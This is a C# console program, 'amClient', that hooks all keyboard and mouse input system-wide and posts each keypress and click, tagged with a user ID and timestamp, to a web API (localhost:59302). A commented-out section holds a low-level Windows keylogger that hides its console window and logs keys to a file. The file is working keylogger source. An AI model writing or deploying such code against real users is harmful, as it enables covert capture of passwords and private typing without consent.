using Gma.System.MouseKeyHook;
using System;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace amClient
{
    class Program
    {
        private static IKeyboardMouseEvents m_Events;

        public static void Main()
        {
            //API
            RunAsync().Wait();

            SubscribeGlobal();

            Application.Run();
        }

        private static void SubscribeGlobal()
        {
            Unsubscribe();
            Subscribe(Hook.GlobalEvents());
        }

        private static void Subscribe(IKeyboardMouseEvents events)
        {
            m_Events = events;
            //m_Events.KeyDown += OnKeyDown;
            //m_Events.KeyUp += OnKeyUp;
            m_Events.KeyPress += HookManager_KeyPress;

            //m_Events.MouseUp += OnMouseUp;
            m_Events.MouseClick += OnMouseClick;
            //m_Events.MouseDoubleClick += OnMouseDoubleClick;

            //m_Events.MouseMove += HookManager_MouseMove;

            //m_Events.MouseDragStarted += OnMouseDragStarted;
            //m_Events.MouseDragFinished += OnMouseDragFinished;

            //if (checkBoxSupressMouseWheel.Checked)
            //    m_Events.MouseWheelExt += HookManager_MouseWheelExt;
            //else
            //    m_Events.MouseWheel += HookManager_MouseWheel;

            //if (checkBoxSuppressMouse.Checked)
            //    m_Events.MouseDownExt += HookManager_Supress;
            //else
            //    m_Events.MouseDown += OnMouseDown;
        }

        private static void Unsubscribe()
        {
            if (m_Events == null) return;
            //m_Events.KeyDown -= OnKeyDown;
            //m_Events.KeyUp -= OnKeyUp;
            m_Events.KeyPress -= HookManager_KeyPress;

            //m_Events.MouseUp -= OnMouseUp;
            m_Events.MouseClick -= OnMouseClick;
            //m_Events.MouseDoubleClick -= OnMouseDoubleClick;

            //m_Events.MouseMove -= HookManager_MouseMove;

            //m_Events.MouseDragStarted -= OnMouseDragStarted;
            //m_Events.MouseDragFinished -= OnMouseDragFinished;

            //if (checkBoxSupressMouseWheel.Checked)
            //    m_Events.MouseWheelExt -= HookManager_MouseWheelExt;
            //else
            //    m_Events.MouseWheel -= HookManager_MouseWheel;

            //if (checkBoxSuppressMouse.Checked)
            //    m_Events.MouseDownExt -= HookManager_Supress;
            //else
            //    m_Events.MouseDown -= OnMouseDown;

            m_Events.Dispose();
            m_Events = null;
        }

        private static void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            //Log(string.Format("KeyPress \t\t {0}\n", e.KeyChar));

            var monitor = new amModel();
            monitor.amModelId = Guid.NewGuid().ToString();
            monitor.KeyLogCatch = e.KeyChar.ToString();
            monitor.InputType = "Keyboard";
            monitor.TimeStamp = DateTime.Now;
            monitor.userID = "HWK";

            CreateMonitoringAsync(monitor);
        }

        private static void OnMouseClick(object sender, MouseEventArgs e)
        {
            //Log(string.Format("MouseClick \t\t {0}\n", e.Button));

            var monitor = new amModel();
            monitor.amModelId = Guid.NewGuid().ToString();
            monitor.KeyLogCatch = e.Button.ToString();
            monitor.InputType = "Mouse";
            monitor.TimeStamp = DateTime.Now;
            monitor.userID = "HWK";

            CreateMonitoringAsync(monitor);
        }

        private static void Log(string text)
        {
            //if (IsDisposed) return;
            //textBoxLog.AppendText(text);
            //textBoxLog.ScrollToCaret();
        }

        #region Comment Just for Cause

        //#region KeyLogger

        //private const int WH_KEYBOARD_LL = 13;
        //private const int WM_KEYDOWN = 0x0100;
        //private static LowLevelKeyboardProc _proc = HookCallback;
        //private static IntPtr _hookID = IntPtr.Zero;
        //const int SW_HIDE = 0;

        //private static IntPtr SetHook(LowLevelKeyboardProc proc)
        //{
        //    using (Process curProcess = Process.GetCurrentProcess())
        //    using (ProcessModule curModule = curProcess.MainModule)
        //    {
        //        return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
        //            GetModuleHandle(curModule.ModuleName), 0);
        //    }
        //}

        //private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        //private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        //{
        //    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        //    {
        //        int vkCode = Marshal.ReadInt32(lParam);
        //        Console.WriteLine((Keys)vkCode);
        //        StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
        //        sw.Write((Keys)vkCode);
        //        sw.Close();

        //        var monitor = new amModel();
        //        monitor.amModelId = Guid.NewGuid().ToString();
        //        monitor.KeyLogCatch = ((Keys)vkCode).ToString();
        //        monitor.TimeStamp = DateTime.Now;
        //        monitor.userID = "HWK";

        //        CreateMonitoringAsync(monitor);
        //    }
        //    return CallNextHookEx(_hookID, nCode, wParam, lParam);
        //}

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //[return: MarshalAs(UnmanagedType.Bool)]
        //private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        //[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr GetModuleHandle(string lpModuleName);

        //[DllImport("kernel32.dll")]
        //static extern IntPtr GetConsoleWindow();

        //[DllImport("user32.dll")]
        //static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        //#endregion

        //public static void Main()
        //{
        //    var handle = GetConsoleWindow();

        //    //API
        //    RunAsync().Wait();

        //    // Hide
        //    ShowWindow(handle, SW_HIDE);

        //    _hookID = SetHook(_proc);

        //    Application.Run();

        //    UnhookWindowsHookEx(_hookID);
        //}

        #endregion

        static HttpClient client = new HttpClient();

        static async Task RunAsync()
        {
            // New code:
            client.BaseAddress = new Uri("http://localhost:59302");
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
        }

        static async Task<amModel> GetMonitoringModelSampleData(string path)
        {
            amModel monitor = null;
            HttpResponseMessage response = await client.GetAsync(path);
            if (response.IsSuccessStatusCode)
            {
                monitor = await response.Content.ReadAsAsync<amModel>();
            }
            return monitor;
        }

        static async Task<Uri> CreateMonitoringAsync(amModel monitor)
        {
            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController", monitor);
            response.EnsureSuccessStatusCode();

            // Return the URI of the created resource.
            return response.Headers.Location;
        }
    }
}
